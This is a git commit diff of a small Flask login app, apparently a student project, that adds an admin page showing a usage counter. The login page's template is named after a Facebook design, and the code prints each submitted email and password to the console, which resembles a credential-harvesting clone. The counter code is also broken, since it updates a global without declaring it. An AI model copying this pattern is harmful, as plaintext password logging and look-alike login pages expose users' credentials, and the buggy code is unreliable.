29024454add840e9f62eb00b542f067140f911c0
mouad <b.afaellah.studies@gmail.com>
2023-02-13 23:38:59 +0100

    add site of admin

--- index.py
+++ index.py
@@ -6,51 +6,25 @@ app = Flask(__name__)
 @app.route('/')  
 def index():
     error = False
-    return render_template("siteFacebookPHoneDesigne.html",error = error)
-    
+    return render_template("siteFacebookPHoneDesigne.html",error = error )
+
+#Variable d'application globale (serveur)
+uses =0 
+
 @app.route('/',  methods=['POST'])
 def login():
     error = True
     email = request.form.get('email')
     password = request.form.get('password')
+    uses =uses + 1 
     print(email)
     print(password)
-    return render_template("gold-site.html")  if checkUsernameAndPassword(email, password) else render_template("siteFacebookPHoneDesigne.html" , error = error)
+    return render_template("gold-site.html")  if checkUsernameAndPassword(email, password) else render_template("siteFacebookPHoneDesigne.html" , error = error )
 
 
-# @app.route('/',methods=['GET'])
-# def index():
-#     return ''' <form method="post" action="/login" >
-#              <input type=text name=nom>
-#              <input type=text name=prenom>
-
-#              <input type=submit value=Login>
-#         </form> 
-#         '''
-
-# @app.route('/login',  methods=['POST'])
-# def login():
-#     nom_p = request.form.get('nom')
-#     prenom_p = request.form.get('prenom')
-#     return "Bonjour M." + nom_p + "," + prenom_p
-
-# @app.route('/admin/<ville>/ana/',  methods=['GET'])
-# def admin(ville):
-#     nom_p = request.args.get('nom')
-#     prenom_p = request.args.get('prenom')
-#     with open("./login_data.txt", "a") as f:
-#         f.write("Username: " + nom_p + "\n")
-#         f.write("Prenom: " + prenom_p + "\n")
-#         f.write("Ville: " + ville + "\n")
-#         f.write("========================"+"\n")
-#     return "Bonjour M." + nom_p + "," + prenom_p
-
-
-# @app.route('/login',  methods=['POST'])
-# def login():
-#     nom_p = request.form.get('nom')
-#     prenom_p = request.form.get('prenom')
-#     return "Bonjour M." + nom_p + "," + prenom_p
+@app.route('/admin/count')
+def count():    
+    return render_template("admin-site.html",  uses = uses)
 
 
 if __name__ == "__main__":
